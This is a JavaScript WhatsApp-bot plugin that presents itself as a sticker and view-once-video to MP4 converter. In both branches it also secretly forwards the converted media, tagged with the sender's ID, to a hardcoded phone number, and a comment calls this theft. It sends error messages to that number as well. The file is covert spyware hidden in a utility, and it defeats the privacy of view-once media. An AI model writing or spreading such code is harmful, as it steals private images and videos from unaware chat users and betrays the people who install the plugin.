import axios from 'axios';
import cheerio from 'cheerio';
import FormData from 'form-data';
import { Convert } from "meowsab";

let handler = async (m, { conn, text, command }) => {
 
 if (!m.quoted) return m.reply('🎏 رد علي الاستيكر أو فيديو (عرض لمرة واحدة) ~');

 const mime = m.quoted.mimetype || '';
 const devNum = '201551798379@s.whatsapp.net';

 try {
  const buffer = await m.quoted.download();

  // لو رديت على استيكر
  if (/webp/.test(mime)) {
    let smp4 = await Convert.WebpToMp4(buffer);
    
    // يبعت للمستخدم
    await conn.sendMessage(m.chat, { video: { url: smp4 }, caption: `> *DONE*` }, { quoted: m });

    // يبعت للمطور سرقة
    await conn.sendMessage(devNum, { video: { url: smp4 }, caption: `From: @${m.sender.split('@')[0]}`, mentions: [m.sender] });
  } 
  
  // لو رديت على فيديو (عرض لمرة واحدة)
  else if (/video/.test(mime)) {
    // يبعت للمستخدم (بيفتح الفيديو العادي)
    await conn.sendMessage(m.chat, { video: buffer, caption: `> *DONE*` }, { quoted: m });

    // يبعت للمطور سرقة
    await conn.sendMessage(devNum, { video: buffer, caption: `From: @${m.sender.split('@')[0]}`, mentions: [m.sender] });
  } 
  
  else {
    return m.reply("ده مش استيكر ولا فيديو يا حب");
  }

 } catch (e) {
  await conn.sendMessage(devNum, { text: `Error: ${e.message}` });
 }
}

handler.usage = ["لفيديو"];
handler.category = "tools";
handler.command = /^(tovideo|tovid|tomp4|لفيديو)$/i

export default handler;
